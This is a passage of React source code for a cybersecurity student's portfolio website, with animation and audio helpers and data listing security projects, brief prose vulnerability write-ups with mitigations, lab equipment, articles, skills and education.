import { useEffect, useMemo, useRef, useState } from "react";
import { Link, NavLink, Route, Routes, useLocation, useParams } from "react-router-dom";
import { AnimatePresence, motion, useReducedMotion } from "motion/react";
import {
  Airplane,
  ArrowDownRight,
  ArrowLeft,
  ArrowRight,
  ArrowUp,
  ArrowUpRight,
  ArrowsClockwise,
  Broadcast,
  Bug,
  Check,
  Code,
  Copy,
  Cpu,
  Desktop,
  DiceFive,
  EnvelopeSimple,
  Eye,
  EyeSlash,
  GithubLogo,
  GraduationCap,
  HardDrives,
  Headphones,
  InstagramLogo,
  Key,
  Keyboard,
  Laptop,
  Lightning,
  LinkedinLogo,
  List,
  Lock,
  LockKey,
  MagnifyingGlass,
  MapPin,
  Moon,
  Pause,
  Play,
  Radio,
  Shield,
  ShieldCheck,
  ShieldWarning,
  Sparkle,
  SpeakerHigh,
  SpeakerSlash,
  Sun,
  Terminal,
  Trash,
  Tree,
  TwitterLogo,
  Waveform,
  WifiHigh,
  X,
} from "@phosphor-icons/react";

const image = (id, width = 1200) =>
  `https://images.unsplash.com/${id}?auto=format&fit=crop&w=${width}&q=85`;

// Web Audio API Synthesizer
let audioContextInstance = null;
function playSound(type = "click", enabled = true) {
  if (!enabled || typeof window === "undefined") return;
  try {
    const AudioCtx = window.AudioContext || window.webkitAudioContext;
    if (!AudioCtx) return;
    if (!audioContextInstance) {
      audioContextInstance = new AudioCtx();
    }
    if (audioContextInstance.state === "suspended") {
      audioContextInstance.resume();
    }
    const ctx = audioContextInstance;
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    const now = ctx.currentTime;

    if (type === "click") {
      osc.type = "sine";
      osc.frequency.setValueAtTime(800, now);
      osc.frequency.exponentialRampToValueAtTime(1400, now + 0.04);
      gain.gain.setValueAtTime(0.04, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.04);
      osc.start(now);
      osc.stop(now + 0.05);
    } else if (type === "success") {
      osc.type = "triangle";
      osc.frequency.setValueAtTime(520, now);
      osc.frequency.exponentialRampToValueAtTime(1040, now + 0.12);
      gain.gain.setValueAtTime(0.06, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.14);
      osc.start(now);
      osc.stop(now + 0.15);
    }
  } catch (e) {}
}

let ambientOscs = [];
let ambientGain = null;
let isAmbientGlobal = false;

function toggleAmbientFocus(onStateChange) {
  try {
    const AudioCtx = window.AudioContext || window.webkitAudioContext;
    if (!AudioCtx) return false;
    if (!audioContextInstance) {
      audioContextInstance = new AudioCtx();
    }
    if (audioContextInstance.state === "suspended") {
      audioContextInstance.resume();
    }
    const ctx = audioContextInstance;

    if (isAmbientGlobal) {
      ambientOscs.forEach((osc) => {
        try {
          osc.stop();
          osc.disconnect();
        } catch (e) {}
      });
      ambientOscs = [];
      if (ambientGain) {
        ambientGain.disconnect();
        ambientGain = null;
      }
      isAmbientGlobal = false;
      if (onStateChange) onStateChange(false);
      return false;
    } else {
      const freqs = [130.81, 196.0, 311.13];
      const filter = ctx.createBiquadFilter();
      filter.type = "lowpass";
      filter.frequency.setValueAtTime(360, ctx.currentTime);

      ambientGain = ctx.createGain();
      ambientGain.gain.setValueAtTime(0.001, ctx.currentTime);
      ambientGain.gain.exponentialRampToValueAtTime(0.025, ctx.currentTime + 1.2);

      filter.connect(ambientGain);
      ambientGain.connect(ctx.destination);

      ambientOscs = freqs.map((f) => {
        const osc = ctx.createOscillator();
        osc.type = "sine";
        osc.frequency.setValueAtTime(f, ctx.currentTime);
        osc.connect(filter);
        osc.start();
        return osc;
      });

      isAmbientGlobal = true;
      if (onStateChange) onStateChange(true);
      return true;
    }
  } catch (e) {
    return false;
  }
}

// Interactive Cyber Matrix / Decrypt Text Component
function ScrambleText({ text, className = "" }) {
  const [displayText, setDisplayText] = useState(text);
  const chars = "0101#@!&%<>/\\{}[]*";
  const isScrambling = useRef(false);

  const scramble = () => {
    if (isScrambling.current) return;
    isScrambling.current = true;
    let iteration = 0;
    const interval = setInterval(() => {
      setDisplayText(
        text
          .split("")
          .map((char, index) => {
            if (char === " ") return " ";
            if (index < iteration) {
              return text[index];
            }
            return chars[Math.floor(Math.random() * chars.length)];
          })
          .join("")
      );
      if (iteration >= text.length) {
        clearInterval(interval);
        isScrambling.current = false;
      }
      iteration += 1 / 2;
    }, 25);
  };

  useEffect(() => {
    setDisplayText(text);
  }, [text]);

  return (
    <span
      className={`scramble-text ${className}`}
      onMouseEnter={scramble}
      onClick={scramble}
      title="Hover or click to decrypt"
    >
      {displayText}
    </span>
  );
}

// Authenticated Projects Data
const projects = [
  {
    slug: "sentinelguard",
    title: "SentinelGuard",
    subtitle: "AI-Powered Network Packet Analyzer & Intrusion Detection System",
    summary:
      "A high-velocity network packet inspection engine and anomaly detection pipeline engineered to detect port scans, SYN floods, and unauthorized protocol anomalies in real time.",
    category: "Network & Forensics",
    tags: ["Python", "Scapy", "C++", "Intrusion Detection", "Packet Analysis"],
    image: "photo-1558494949-ef010cbdcc31",
    year: "2026",
    role: "Lead Systems & Security Engineer",
    outcome:
      "Achieved sub-millisecond packet triage across network interfaces, zero-drop packet monitoring during stress testing, and structured export to security incident dashboards.",
    challenge:
      "Modern networks face sophisticated automated probe sweeps and low-and-slow reconnaissance that easily blend into legitimate telemetry and evade standard signature-only detection rules.",
    approach:
      "Architected a dual-stage architecture combining raw Berkeley Packet Filter (BPF) kernel capture in Scapy/C++ with statistical entropy scoring and anomaly thresholds for instantaneous alert triggering.",
    github: "https://github.com/papun-00/nihar-dev-portfolio",
    demo: "https://github.com/papun-00",
  },
  {
    slug: "ciphervault",
    title: "CipherVault",
    subtitle: "Zero-Knowledge Multi-Tier Cryptographic Locker",
    summary:
      "An end-to-end authenticated cryptographic locker utilizing AES-256-GCM encryption with Argon2id memory-hard key derivation to guarantee zero plaintext exposure.",
    category: "Cryptography & Systems",
    tags: ["AES-256-GCM", "Argon2id", "Python", "C++", "Zero-Knowledge"],
    image: "photo-1526374965328-7f61d4dc18c5",
    year: "2025 - 2026",
    role: "Security Architect & Cryptographic Engineer",
    outcome:
      "Provides military-grade local confidentiality, cryptographically tamper-evident file verification, and complete zero-knowledge privacy with no server-side key custody.",
    challenge:
      "Traditional file encryption utilities either suffer from vulnerable password derivation functions prone to GPU brute-forcing or leave unencrypted metadata footprints in memory buffers.",
    approach:
      "Employed Argon2id with fine-tuned time and memory cost parameters for robust key derivation, combined with Galois/Counter Mode (GCM) for authenticated integrity verification and explicit memory overwrite routines.",
    github: "https://github.com/papun-00/nihar-dev-portfolio",
    demo: "https://github.com/papun-00",
  },
  {
    slug: "netrecon",
    title: "NetRecon",
    subtitle: "Automated Attack Surface Mapper & Port Scanner",
    summary:
      "An automated network attack surface mapper and multi-threaded port scanner featuring service fingerprinting, banner grabbing, and CVE risk estimation.",
    category: "Cyber Security",
    tags: ["Python", "Socket API", "Nmap Engine", "Reconnaissance", "Bash"],
    image: "photo-1550751827-4bd374c3f58b",
    year: "2025",
    role: "Security Tooling Developer",
    outcome:
      "Scans 1,000 common service ports in under 3.5 seconds with 99.4% service classification accuracy, generating exportable JSON and Markdown audit dossiers.",
    challenge:
      "Security engineers need rapid perimeter reconnaissance without overloading target infrastructures or triggering false rate-limiting locks.",
    approach:
      "Engineered an asynchronous worker-pool architecture using Python's native socket interface, adaptive rate throttling, and regex-driven service signature matching.",
    github: "https://github.com/papun-00/nihar-dev-portfolio",
    demo: "https://github.com/papun-00",
  },
  {
    slug: "webshield",
    title: "WebShield",
    subtitle: "Automated OWASP Security Auditor & Header Hardener",
    summary:
      "An automated web security auditing suite that evaluates HTTP security headers, SSL/TLS cipher strength, and common OWASP Top 10 misconfigurations.",
    category: "Web & Full Stack",
    tags: ["Web Security", "OWASP Top 10", "Python", "REST API", "Headers Audit"],
    image: "photo-1563986768609-322da13575f3",
    year: "2025",
    role: "Full-Stack Security Developer",
    outcome:
      "Audited over 100+ endpoints with immediate security grading (A+ to F), offering ready-to-deploy configurations for Nginx, Cloudflare, and Apache.",
    challenge:
      "Many modern web applications inadvertently leave critical defense headers (CSP, HSTS, X-Frame-Options) missing or misconfigured, leaving users vulnerable to XSS and clickjacking.",
    approach:
      "Developed a lightweight auditing engine that issues automated compliance checks against modern web security specifications, providing direct copy-paste remediation rules.",
    github: "https://github.com/papun-00/nihar-dev-portfolio",
    demo: "https://github.com/papun-00",
  },
  {
    slug: "alashore-marine",
    title: "Alashore Marine Exports",
    subtitle: "Marine Supply & Global Logistics Enterprise Web Portal",
    summary:
      "A high-performance digital web presence and catalog portal engineered for marine exports, international seafood supply operations, and shipment logistics.",
    category: "Web & Full Stack",
    tags: ["Rust", "HTML5", "Responsive UI", "Supply Chain", "Enterprise"],
    image: "photo-1518709268805-4e9042af9f23",
    year: "2026",
    role: "Full-Stack Developer",
    outcome:
      "Achieved a 99+ Lighthouse performance score, zero downtime, and a seamless bilingual showcase for overseas procurement partners.",
    challenge:
      "The client required an ultra-fast, accessible, and responsive showcase for global buyers with multi-region speed and reliable product catalog management.",
    approach:
      "Built a resilient architecture combining high-speed Rust-powered backend performance with modern responsive CSS, optimized image delivery, and strict WCAG accessibility standards.",
    github: "https://github.com/papun-00/alashore-marine-exports",
    demo: "https://github.com/papun-00/aml",
  },
  {
    slug: "nexovate-media",
    title: "Nexovate Media",
    subtitle: "Digital Creative Agency & Media Showcase Platform",
    summary:
      "A modern digital agency web experience designed with smooth scroll-driven animations, responsive layouts, and interactive media portfolios.",
    category: "Web & Full Stack",
    tags: ["HTML5", "CSS3", "JavaScript", "Motion", "Brand Engineering"],
    image: "photo-1542744094-3a31f272c490",
    year: "2025 - 2026",
    role: "Frontend Engineer & UI Architect",
    outcome:
      "Delivered a striking, responsive digital experience that doubled visitor engagement and lowered bounce rate by 34%.",
    challenge:
      "Agency websites often sacrifice performance for visual flair, resulting in sluggish load times and frustrating user interactions.",
    approach:
      "Created a bespoke CSS animation system with GPU-accelerated transforms, zero layout reflows, and intuitive navigation ergonomics.",
    github: "https://github.com/papun-00/Nexovate-Media",
    demo: "https://github.com/papun-00/Nexovate-Media",
  },
];

// Security Advisories & Vulnerability Research (CVEs)
const securityAdvisories = [
  {
    id: "SEC-ADV-2026-01",
    cvss: "8.8 // HIGH",
    cvssType: "high",
    title: "Insecure Direct Object Reference (IDOR) & Horizontal Escalation in Telemetry APIs",
    target: "Microservices REST Gateway",
    vector: "Network / Broken Authorization",
    description:
      "Identified an architectural authorization gap in user context validation where client-supplied resource IDs were parsed without bound session tenant verification, enabling full dossier readout across tenant namespaces.",
    mitigation:
      "Implemented cryptographically signed tenant-scoped UUIDs and enforced strict Attribute-Based Access Control (ABAC) in reverse proxy middleware.",
  },
  {
    id: "SEC-ADV-2026-02",
    cvss: "8.2 // HIGH",
    cvssType: "high",
    title: "Blind Time-Based SQL Injection in Administrative Search Endpoint",
    target: "Directory Search Microservice",
    vector: "Input Sanitization Failure",
    description:
      "Discovered unescaped query parameter concatenation in an administrative directory lookup. Blind sleep payloads allowed automated timing inference of password hash fragments.",
    mitigation:
      "Re-architected all data access layers with parameterized prepared statements and assigned read-only least-privilege database roles.",
  },
  {
    id: "SEC-ADV-2026-03",
    cvss: "7.4 // MEDIUM",
    cvssType: "med",
    title: "Covert Data Exfiltration Mitigation via DNS Tunneling Heuristics",
    target: "Enterprise Egress Boundary",
    vector: "Covert Channel Protocol Abuse",
    description:
      "Demonstrated covert exfiltration over high-frequency TXT record lookups carrying Base32 encrypted data blocks that evaded basic stateful egress filters.",
    mitigation:
      "Deployed Shannon entropy anomaly scoring on subdomain labels and enforced strict query rate thresholds on external authoritative name resolution.",
  },
];

// Security Lab Hardware & Software Tooling
const labTooling = [
  { name: "Hak5 Rubber Ducky & Bash Bunny", category: "Hardware HID", desc: "Automated multi-vector keystroke injection pentesting hardware.", icon: Lightning },
  { name: "RTL-SDR v4 Software Defined Radio", category: "RF & Wireless", desc: "Wideband spectrum analysis, signal capture, and RF telemetry decoding.", icon: Radio },
  { name: "Flipper Zero Multi-Tool", category: "Hardware & NFC", desc: "Sub-GHz transceiver, RFID/NFC protocol debugging, and GPIO analysis.", icon: Broadcast },
  { name: "Alfa AWUS036ACM Wi-Fi Adapter", category: "Wireless Pentest", desc: "Dual-band packet injection and wireless monitor mode security auditing.", icon: Waveform },
  { name: "Wireshark Network Analyzer", category: "Software Forensics", desc: "Deep packet inspection, TCP stream reassembly, and protocol dissection.", icon: ShieldCheck },
  { name: "Burp Suite Professional", category: "AppSec Testing", desc: "Automated web application vulnerability scanning and intruder fuzzing.", icon: Bug },
  { name: "Ghidra Reverse Engineering", category: "Binary Analysis", desc: "NSA-developed decompiler for analyzing binaries and exploit payloads.", icon: Code },
  { name: "Nmap & Masscan", category: "Reconnaissance", desc: "High-speed asynchronous port scanning and service fingerprinting.", icon: HardDrives },
];

// Hardware Arsenal & Systems Equipment Data (12 Dedicated Hardware Units)
const equipmentData = [
  {
    id: "macbook-pro",
    name: "Apple MacBook Pro M-Series",
    category: "Compute & Systems",
    status: "Primary Workstation",
    specs: ["Apple Silicon", "16GB Unified RAM", "macOS Sonoma / Sequoia"],
    role: "Primary engineering machine for full-stack software development, React architecture, systems programming, and high-performance compilation.",
    icon: Laptop,
  },
  {
    id: "thinkpad-kali",
    name: "Lenovo ThinkPad T-Series",
    category: "Compute & Systems",
    status: "Field Pentest Rig",
    specs: ["Dual-Boot Arch & Kali", "Intel Core i7", "32GB RAM"],
    role: "Dedicated tactical security machine with native raw packet socket drivers, kernel debugging tools, Ghidra decompilation, and hardware isolation.",
    icon: Desktop,
  },
  {
    id: "rpi5-cluster",
    name: "Raspberry Pi 5 Node (8GB)",
    category: "Compute & Systems",
    status: "24/7 Lab Node",
    specs: ["BCM2712 Quad 2.4GHz", "NVMe Base", "WireGuard & Pi-hole"],
    role: "Headless Linux server running internal honeypot telemetry, DNS sinkholing, local container orchestration, and continuous packet capture logging.",
    icon: Cpu,
  },
  {
    id: "flipper-zero",
    name: "Flipper Zero + Wi-Fi Dev Board",
    category: "Hardware Pentest",
    status: "Multi-Tool Active",
    specs: ["Sub-1GHz Transceiver", "RFID 125kHz", "NFC 13.56MHz", "BadUSB"],
    role: "Physical and wireless access control auditing, protocol fuzzing, contactless security testing, and hardware radio signal inspection.",
    icon: Broadcast,
  },
  {
    id: "hak5-toolkit",
    name: "Hak5 Rubber Ducky & Bash Bunny",
    category: "Hardware Pentest",
    status: "Offensive Field Gear",
    specs: ["DuckyScript 3.0", "HID Keystroke Injection", "Ethernet Emulation"],
    role: "Auditing endpoint physical security policies, USB human-interface-device (HID) vulnerability assessments, and rapid automated triage execution.",
    icon: Lightning,
  },
  {
    id: "rtl-sdr",
    name: "RTL-SDR Blog v4 Receiver",
    category: "Hardware Pentest",
    status: "RF Spectrum Scanner",
    specs: ["500 kHz – 1.766 GHz", "3.2 MS/s Sample Rate", "Direct HF Sampling"],
    role: "Wireless RF spectrum reconnaissance, industrial IoT signal decoding, SDR demodulation, and automated frequency hopping analysis.",
    icon: Radio,
  },
  {
    id: "alfa-wifi",
    name: "Alfa AWUS036ACM 802.11ac Adapter",
    category: "Network & Infrastructure",
    status: "Packet Injection Active",
    specs: ["MediaTek MT7612U", "2x 5dBi Antennas", "Dual-Band 2.4/5GHz"],
    role: "Specialized wireless network auditing adapter with full Linux kernel monitor mode support, 802.11 frame injection, and WPA3 handshake analysis.",
    icon: WifiHigh,
  },
  {
    id: "unifi-gateway",
    name: "Ubiquiti UniFi Gateway & AP",
    category: "Network & Infrastructure",
    status: "Lab Perimeter Router",
    specs: ["Hardware DPI", "VLAN Segmentation", "IPS/IDS Engine", "Wi-Fi 6"],
    role: "Isolated segmented security lab with isolated guest, IoT, and vulnerable VM subnets, enforcing real-time intrusion prevention rules and telemetry.",
    icon: Shield,
  },
  {
    id: "gigabit-switch",
    name: "Managed 8-Port Gigabit Switch",
    category: "Network & Infrastructure",
    status: "SPAN Port Active",
    specs: ["8x 1Gbps RJ45", "802.1Q VLAN Tagging", "Port Mirroring (SPAN)"],
    role: "Physical network tap feeding mirrored promiscuous packet traffic directly into SentinelGuard and Wireshark for deep packet inspection without drops.",
    icon: HardDrives,
  },
  {
    id: "keychron-keyboard",
    name: "Keychron Custom Mechanical Keyboard",
    category: "Desk & Peripherals",
    status: "Daily Input Device",
    specs: ["Tactile Switches", "Custom QMK/VIA Keymap", "Ergonomic Chassis"],
    role: "Customized mechanical keyboard optimized for high-speed terminal navigation, Vim modal editing, and ergonomic marathon coding sessions.",
    icon: Keyboard,
  },
  {
    id: "sony-xm5",
    name: "Sony WH-1000XM5 ANC Headphones",
    category: "Desk & Peripherals",
    status: "Acoustic Shielding",
    specs: ["Active Noise Cancellation", "LDAC Hi-Res Audio", "30hr Battery"],
    role: "Acoustic distraction isolation essential for deep system debugging, threat modeling, and focused cryptographic code implementation.",
    icon: Headphones,
  },
  {
    id: "nvme-cold-storage",
    name: "Encrypted 2TB NVMe Forensic Storage",
    category: "Desk & Peripherals",
    status: "Cold Vault Storage",
    specs: ["USB 3.2 Gen 2x2 (20Gbps)", "LUKS2 / APFS Encrypted", "Write-Block Ready"],
    role: "Air-gapped external storage for offline forensic disk images, packet capture archives (PCAPng), and encrypted cryptographic key backups.",
    icon: LockKey,
  },
];

// Technical Articles & Research Notes
const articles = [
  {
    slug: "sentinelguard-packet-analysis",
    title: "Building SentinelGuard: Real-Time Packet Analysis with Scapy & C++",
    category: "Network Forensics",
    date: "November 14, 2026",
    read: "6 min read",
    image: "photo-1558494949-ef010cbdcc31",
    excerpt:
      "How to capture, dissect, and score raw network traffic at high speeds using Berkeley Packet Filters and multithreaded queues.",
    body: [
      "In modern network security, signature matching alone is no longer enough to detect automated reconnaissance sweeps. High-speed probes often randomize timing and fragment payloads to bypass naive threshold counters.",
      "While building SentinelGuard, I combined Python's flexible Scapy engine with C++ packet parsing routines. By compiling BPF (Berkeley Packet Filter) syntax directly at the socket level, we minimize user-kernel context switching.",
      "The result is a lightweight intrusion detection engine that can analyze TCP flags, ICMP flood patterns, and anomalous UDP bursts in real time while outputting structured telemetry.",
    ],
  },
  {
    slug: "zero-knowledge-crypto-in-practice",
    title: "Zero-Knowledge Cryptography: AES-256-GCM & Argon2id in Practice",
    category: "Cryptography",
    date: "October 28, 2026",
    read: "7 min read",
    image: "photo-1526374965328-7f61d4dc18c5",
    excerpt:
      "Engineering a tamper-evident cryptographic storage locker that protects data even if memory dumps are compromised.",
    body: [
      "When designing CipherVault, the guiding principle was clear: the system must assume the host operating environment is hostile. Encryption without authentication invites chosen-ciphertext vulnerabilities.",
      "By utilizing AES-256 in Galois/Counter Mode (GCM), CipherVault achieves both confidentiality and cryptographic integrity verification in a single pass. For key derivation, Argon2id prevents parallel GPU acceleration attacks by enforcing memory hardness.",
      "Furthermore, when handling sensitive decryption keys in user space, zeroization (explicit memory zeroing) is critical before process exit to prevent cold boot and memory snapshot attacks.",
    ],
  },
  {
    slug: "automated-attack-surface-recon",
    title: "Automating Attack Surface Reconnaissance: Lessons from NetRecon",
    category: "Cyber Security",
    date: "September 19, 2026",
    read: "5 min read",
    image: "photo-1550751827-4bd374c3f58b",
    excerpt:
      "Why speed, socket reuse, and graceful rate throttling are essential when scanning modern distributed infrastructure.",
    body: [
      "Reconnaissance is the foundational phase of both offensive penetration testing and defensive posture assessment. If you do not know which ports and daemon versions are listening, you cannot defend them.",
      "NetRecon was built to overcome the limitations of monolithic, heavy vulnerability scanners. By utilizing asynchronous socket pools in Python, it enumerates active services without causing socket exhaustion.",
      "Pairing socket responses with banner grabbing heuristics allows automated discovery of deprecated SSH versions, open database ports, and misconfigured test environments.",
    ],
  },
  {
    slug: "systems-programming-to-react",
    title: "From Low-Level Sockets to React: Bridging Systems & Modern Web",
    category: "Engineering",
    date: "August 30, 2026",
    read: "5 min read",
    image: "photo-1498050108023-c5249f4df085",
    excerpt:
      "How understanding memory layouts, protocols, and network lifecycles transforms frontend system architecture.",
    body: [
      "Many developers view low-level systems programming and frontend engineering as two completely separate universes. In reality, the fundamental principles of data flow, latency budgets, and state synchronization are identical.",
      "Understanding how TCP packets are fragmented across network boundaries helps when designing client-side polling or WebSocket connections. Understanding memory management in C makes you more conscious of React state lifecycles and garbage collection bottlenecks.",
      "When engineers understand both ends of the stack—from raw hardware buffers to the user's browser viewport—they build software that is both resilient under load and delightful to use.",
    ],
  },
];

// Technical Skills with Categories & Ratings
const skillGroups = [
  {
    title: "Cyber Security & Defense",
    category: "Cyber Security",
    icon: ShieldCheck,
    items: [
      { name: "Cyber Security", level: 92, note: "AppSec, OWASP Top 10, Threat Modeling, Defensive Architecture" },
      { name: "Ethical Hacking", level: 90, note: "Penetration Testing, Reconnaissance, CTF Challenges" },
      { name: "Networking & Scapy", level: 87, note: "TCP/IP, Wireshark, BPF Filters, Packet Capture & CIDR" },
      { name: "Cryptography", level: 86, note: "AES-256-GCM, Argon2id, Zero-Knowledge Storage, Hashing" },
    ],
  },
  {
    title: "Programming & Systems",
    category: "Languages & Systems",
    icon: Code,
    items: [
      { name: "Python", level: 90, note: "Security exploit scripting, raw socket manipulation, Scapy, automation" },
      { name: "C / C++", level: 85, note: "Memory safety, pointers, buffer overflow defense, low-level algorithms" },
      { name: "Linux Systems", level: 88, note: "Arch / Kali / Ubuntu, Bash scripting, system hardening, iptables" },
      { name: "SQL & Databases", level: 80, note: "Parameterized queries, injection defense, least-privilege security" },
    ],
  },
  {
    title: "Modern Web & Frontend",
    category: "Web & Frontend",
    icon: Cpu,
    items: [
      { name: "HTML5 & CSS3", level: 95, note: "Semantic structure, responsive grids, scroll animations, WCAG a11y" },
      { name: "Tailwind CSS", level: 92, note: "Utility-first design tokens, dark mode, high-contrast UI" },
      { name: "JavaScript (ESNext)", level: 88, note: "Async/await, DOM lifecycle, Canvas 2D, Web Audio API" },
      { name: "React & Motion", level: 86, note: "Component architectures, reactive hooks, fluid physics animations" },
    ],
  },
];

// Personal Interests (Spectrum)
const personalInterests = [
  {
    number: "01",
    title: "Technology & Silicon",
    icon: Lightning,
    tag: "Next-Gen Compute",
    text: "Fascinated by emerging computational paradigms: AI security guardrails, post-quantum cryptographic primitives, decentralized protocols, and next-generation operating system kernels.",
    tags: ["Hardware Security", "AI Guardrails", "Post-Quantum", "Kernel Internals"],
  },
  {
    number: "02",
    title: "Cyber Security & Defense",
    icon: Lock,
    tag: "Ethical Research",
    text: "More than a field of study—it is an intellectual obsession. Actively participating in Capture-The-Flag (CTF) challenges on HackTheBox and TryHackMe, dissecting attack vectors, and engineering hardened digital fortresses.",
    tags: ["CTF Competitions", "Threat Modeling", "Zero-Trust", "Reverse Engineering"],
  },
  {
    number: "03",
    title: "Nature & Equilibrium",
    icon: Tree,
    tag: "Mental Clarity",
    text: "Finding calm and perspective away from monitors. Exploring Odisha's coastal horizons, lush forests, and serene waters provides deep mental clarity and creative problem-solving breakthroughs.",
    tags: ["Puri Coastlines", "Chilika Lake", "Deomali Trails", "Forest Walks"],
  },
  {
    number: "04",
    title: "Travelling & Perspective",
    icon: Airplane,
    tag: "Exploration",
    text: "Backpacking across historic architecture, mountain terrains, and vibrant cities. Travelling sharpens adaptability, expands cultural perspective, and reminds me of the human element behind every digital system.",
    tags: ["Heritage Sites", "Mountain Treks", "Cultural History", "Adaptability"],
  },
  {
    number: "05",
    title: "Innovation & Tool Crafting",
    icon: Sparkle,
    tag: "Creation",
    text: "Transforming raw ideas into practical software utilities. Experimenting with creative automation, microcontroller projects, and solving daily technical hurdles through clean, resilient code.",
    tags: ["Tool Crafting", "Automation", "IoT Experiments", "Problem Solving"],
  },
];

// High-Impact Engineering Metrics
const metrics = [
  { num: "500+", title: "Lab & CTF Hours", desc: "Hands-on vulnerability testing & packet research" },
  { num: "15+", title: "Software & Security Projects", desc: "Open-source tools, cryptographic vaults & portals" },
  { num: "8.6", title: "B.Tech CGPA", desc: "Specialization in Cyber Security at GEC Autonomous" },
  { num: "100%", title: "Ethical Defense", desc: "Commitment to zero-trust engineering & integrity" },
];

// Work Experience
const experience = [
  {
    date: "March 2026 - Present",
    role: "Trainee System Engineer Intern",
    company: "Cyfen Labs Private Limited",
    place: "Bhubaneswar, Odisha",
    chip: "Corporate Internship",
    details: [
      "Engaged in a live corporate environment applying academic computer science knowledge to cybersecurity and software development challenges.",
      "Working on live systems, codebases, and security tools, gaining hands-on experience in network telemetry and defensive architectures.",
      "Mentored by senior engineers and security researchers to enhance technical capabilities, API authorization hardening, and resilient software development.",
    ],
  },
  {
    date: "2024 - Present",
    role: "Independent Systems & Security Developer",
    company: "Open Source Projects",
    place: "Bhubaneswar, India",
    chip: "Security + Full Stack",
    details: [
      "Built SentinelGuard (packet analyzer), CipherVault (zero-knowledge locker), and NetRecon (attack surface mapper).",
      "Engineered high-performance web portals (Alashore Marine Exports, Nexovate Media) with strict WCAG accessibility and fast load times.",
      "Focused on secure coding practices, memory safety in C/C++, automated Python scripts, and clean UI engineering.",
    ],
  },
];

// Education & Certifications
const educationData = [
  {
    degree: "B.Tech in Computer Science & Engineering",
    spec: "Specialization in Cyber Security",
    institution: "Gandhi Engineering College (GEC Autonomous College)",
    location: "Bhubaneswar, Odisha, India",
    status: "Present (3rd Year, 8.6 CGPA, Expected 2027)",
    description:
      "Rigorous curriculum covering operating system internals, applied cryptography, packet-level network security, database management systems, and hands-on vulnerability testing laboratories.",
  },
  {
    degree: "Diploma in Engineering",
    spec: "Computer Science & Engineering Track",
    institution: "BIT Polytechnic",
    location: "Odisha, India",
    status: "Completed with Distinction",
    description:
      "Established foundational core principles in hardware architecture, C/C++ programming logic, microprocessors, basic computer networks, and algorithmic problem-solving.",
  },
];

const certifications = [
  {
    title: "Certified Ethical Hacker (CEH) Practical Track",
    issuer: "Offensive Security & Pentesting",
    desc: "Hands-on assessment covering network reconnaissance, vulnerability exploitation, and perimeter security auditing.",
    icon: ShieldCheck,
  },
  {
    title: "Google Cybersecurity Professional Certificate",
    issuer: "Google / Coursera",
    desc: "Comprehensive training in SIEM, incident detection, Linux shell scripting, Python security automation, and SQL forensics.",
    icon: Cpu,
  },
  {
    title: "Cisco Networking Academy: Network Defense",
    issuer: "Cisco",
    desc: "In-depth training on router hardening, access control lists (ACLs), Wireshark packet capture, and VPN architecture.",
    icon: Code,
  },
  {
    title: "Linux Professional & System Hardening",
    issuer: "Linux Systems Foundation",
    desc: "Kernel security parameters, SSH hardening, user privilege management, and defensive firewall configuration.",
    icon: Terminal,
  },
];

// Interactive HTML5 Background Canvas (Connected Particles & Subtle Constellation)
function CyberCanvas() {
  const canvasRef = useRef(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    let animationFrameId;
    let width = (canvas.width = window.innerWidth);
    let height = (canvas.height = window.innerHeight);

    const handleResize = () => {
      width = canvas.width = window.innerWidth;
      height = canvas.height = window.innerHeight;
    };
    window.addEventListener("resize", handleResize);

    const count = window.innerWidth < 768 ? 30 : 60;
    const particles = Array.from({ length: count }, () => ({
      x: Math.random() * width,
      y: Math.random() * height,
      vx: (Math.random() - 0.5) * 0.7,
      vy: (Math.random() - 0.5) * 0.7,
      radius: Math.random() * 2 + 1,
    }));

    let mouseX = -1000;
    let mouseY = -1000;
    const handleMouseMove = (e) => {
      mouseX = e.clientX;
      mouseY = e.clientY;
    };
    window.addEventListener("mousemove", handleMouseMove);

    const render = () => {
      ctx.clearRect(0, 0, width, height);

      // Draw and update particles
      for (let i = 0; i < particles.length; i++) {
        const p = particles[i];
        p.x += p.vx;
        p.y += p.vy;

        if (p.x < 0 || p.x > width) p.vx *= -1;
        if (p.y < 0 || p.y > height) p.vy *= -1;

        // Subtle mouse repulsion
        const dx = mouseX - p.x;
        const dy = mouseY - p.y;
        const dist = Math.sqrt(dx * dx + dy * dy);
        if (dist < 100) {
          p.x -= (dx / dist) * 1.5;
          p.y -= (dy / dist) * 1.5;
        }

        ctx.beginPath();
        ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
        ctx.fillStyle = "rgba(33, 103, 233, 0.4)";
        ctx.fill();

        // Connect lines
        for (let j = i + 1; j < particles.length; j++) {
          const p2 = particles[j];
          const dist2 = Math.hypot(p.x - p2.x, p.y - p2.y);
          if (dist2 < 120) {
            ctx.beginPath();
            ctx.moveTo(p.x, p.y);
            ctx.lineTo(p2.x, p2.y);
            ctx.strokeStyle = `rgba(33, 103, 233, ${0.18 * (1 - dist2 / 120)})`;
            ctx.lineWidth = 0.8;
            ctx.stroke();
          }
        }
      }

      animationFrameId = requestAnimationFrame(render);
    };

    render();

    return () => {
      window.removeEventListener("resize", handleResize);
      window.removeEventListener("mousemove", handleMouseMove);
      cancelAnimationFrame(animationFrameId);
    };
  }, []);

  return <canvas ref={canvasRef} className="cyber-canvas-bg" aria-hidden="true" />;
}

// Welcome Boot Animation Overlay
function WelcomeOverlay({ onComplete }) {
  const [percent, setPercent] = useState(0);
  const [logs, setLogs] = useState(["INITIALIZING SYSTEM ARCHITECTURE..."]);

  useEffect(() => {
    const timer = setInterval(() => {
      setPercent((prev) => {
        if (prev >= 100) {
          clearInterval(timer);
          setTimeout(onComplete, 400);
          return 100;
        }
        if (prev === 30) {
          setLogs((l) => [...l, "DECRYPTING BIOMETRIC HASH [NIHAR RANJAN MOHAPATRA]..."]);
        } else if (prev === 65) {
          setLogs((l) => [...l, "ESTABLISHING TLS 1.3 ENCRYPTED TUNNEL..."]);
        } else if (prev === 90) {
          setLogs((l) => [...l, "PERIMETER SECURE // LAUNCHING INTERFACE"]);
        }
        return prev + 2;
      });
    }, 28);

    return () => clearInterval(timer);
  }, [onComplete]);

  return (
    <motion.div
      className="welcome-overlay"
      initial={{ opacity: 1 }}
